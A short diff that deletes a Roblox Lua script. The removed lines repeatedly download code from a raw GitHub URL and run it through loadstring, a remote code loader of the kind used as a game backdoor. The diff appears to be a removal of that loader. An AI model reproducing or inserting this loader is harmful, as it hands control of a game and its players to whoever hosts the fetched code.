@@ -1,9 +1,0 @@
-
-
-
-while true do
-    wait()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/batusz/main/roblox/wewewe"))()
-end
-
-
